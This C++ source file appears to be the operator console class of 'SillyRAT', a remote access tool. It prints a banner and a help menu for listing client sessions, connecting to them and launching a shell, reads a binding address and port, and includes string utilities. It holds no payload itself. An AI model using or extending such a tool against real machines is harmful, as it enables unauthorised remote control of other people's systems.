#include <iostream>
#include <string>
#include <cstring>
#include <climits>

class INPUT{
private:
    COLORS color;
    std::string address;
    int port;

public:
    void getLogo(){
		std::cout << std::endl << color.BOLD << color.DARKCYAN;
        std::cout << " ____  _ _ _       ____      _  _____ " << std::endl;
        std::cout << "/ ___|(_) | |_   _|  _ \\    / \\|_   _|" << std::endl;
        std::cout << "\\___ \\| | | | | | | |_) |  / _ \\ | |  " << std::endl;
        std::cout << " ___) | | | | |_| |  _ <  / ___ \\| |  " << std::endl;
        std::cout << "|____/|_|_|_|\\__, |_| \\_\\/_/   \\_\\_|  " << std::endl;
        std::cout << "             |___/                    " << std::endl;
        std::cout << color.GREEN << "                     v1.0 @hash3liZer/@TheFlash2k	" << color.END << std::endl << std::endl;
    }
    void getServerHelp(){
        std::cout << std::endl;
        std::cout << color.BOLD << "    Command      :     Description                     " << color.END << std::endl;
        std::cout << "    help         :     Show this Manual                " << std::endl;
        std::cout << "    sessions     :     List Available Sessions ids     " << std::endl;
        std::cout << "    connect <fd> :     Connect to a specific session with given <fd>" << std::endl;
        std::cout << "    disconnect   :     Disconnect from the current Client" << std::endl;
        std::cout << "    shell        :     Launch Shell. Works After connection to client" << std::endl;
        std::cout << "    exit         :     Exit the Terminal and the Server" << std::endl;
        std::cout << std::endl;
    }
    void getAddress(){
        std::cout << color.DARKCYAN << "[?] " << color.END << "Enter Binding Address (0.0.0.0): ";
        std::getline(std::cin, this->address);
    }
    void getPort(){
        std::string ii;
        std::cout << color.DARKCYAN << "[?] " << color.END << "Enter Port Number (54000): ";
        std::getline(std::cin, ii);
        if(strlen(ii.c_str()) > 0 && ii != "\n" && ii != "\r\n" && ii != "\r"){
            this->port = std::stoi(ii);
        }else{
            this->port = 0;
        }
    }
    std::string getInput(){
        std::string ii;
        std::getline(std::cin, ii);
        return this->reduce(ii);
    }
    std::string rtAddress() const{
        return address;
    }
    int rtPort() const{
        return port;
    }

    // Utilities
    std::string trim(const std::string& str, const std::string& whitespace = " \t"){
        const auto strBegin = str.find_first_not_of(whitespace);
        if (strBegin == std::string::npos)
            return ""; // no content

        const auto strEnd = str.find_last_not_of(whitespace);
        const auto strRange = strEnd - strBegin + 1;

        return str.substr(strBegin, strRange);
    }
    std::string reduce(const std::string& str, const std::string& fill = " ", const std::string& whitespace = " \t"){
        // trim first
        auto result = trim(str, whitespace);

        // replace sub ranges
        auto beginSpace = result.find_first_of(whitespace);
        while (beginSpace != std::string::npos){
            const auto endSpace = result.find_first_not_of(whitespace, beginSpace);
            const auto range = endSpace - beginSpace;

            result.replace(beginSpace, range, fill);

            const auto newStart = beginSpace + fill.length();
            beginSpace = result.find_first_of(whitespace, newStart);
        }
        return result;
    }
};